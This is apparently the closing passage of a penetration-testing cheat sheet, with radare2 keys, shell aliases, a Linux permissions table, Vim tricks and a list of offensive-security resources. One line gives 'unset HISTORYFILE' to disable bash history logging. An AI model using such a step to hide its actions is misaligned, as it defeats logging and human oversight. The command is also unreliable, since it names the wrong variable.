* you can add a comment using ;<comment> followed by Enter, remove it using ;- or even use your default text editor to add the comment using ;!.
* m<key> can be used to mark specific offset with a key of your choice. Press '<key> to go to your key. This helps to mark some key addresses that you’d like to quickly navigate to.

# Custom Scripts

## Aliases

Put them in your `.aliases` file and source it in your `.bashrc` or `.zshrc`.

```sh
alias serve='ruby -run -e httpd . -p 8000'
alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
```

## Misc

Disable bash history logging:

```sh
unset HISTORYFILE
```

File authorizations in Linux:

```sh
777 rwxrwxrwx No restriction, global WRX any user can do anything.
755 rwxr-xr-x Owner has full access, others can read and execute the file.
700 rwx------ Owner has full access, no one else has access.
666 rw-rw-rw- All users can read and write but not execute.
644 rw-r--r-- Owner can read and write, everyone else can read.
600 rw------- Owner can read and write, everyone else has no access.
```

## (n)Vim tricks

Remove blank lines:

```
:g/^$/d
```

Remove return carriage:

```
%s/^M//g
```

Replace something:

```
%s/origin/destination/g
```

Sort lines:

```
CTRL-V and select lines or do ggVG
:sort

For invert sort:
:%sort!

For numerical sort:
:sort n
```

# Sources

## Books

* Red Team Field Manual
* Blue Team Field Manual

## Website

* [Absolom.com](https://www.absolomb.com/)
* [Blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
* [GTFObins](https://gtfobins.github.io/)
* [Hacktrics.xyz](https://book.hacktricks.xyz/)
* [LOLBas](https://lolbas-project.github.io/#)
* [Net Security](https://net-security.fr/security/commandes-gnu-linux-pour-detecter-une-intrusion/)
* [PenstestMonkey](http://pentestmonkey.net/)
* [Red Teaming Experiments](https://ired.team/)
* [Security Ramblings](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance)

## Videos

* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
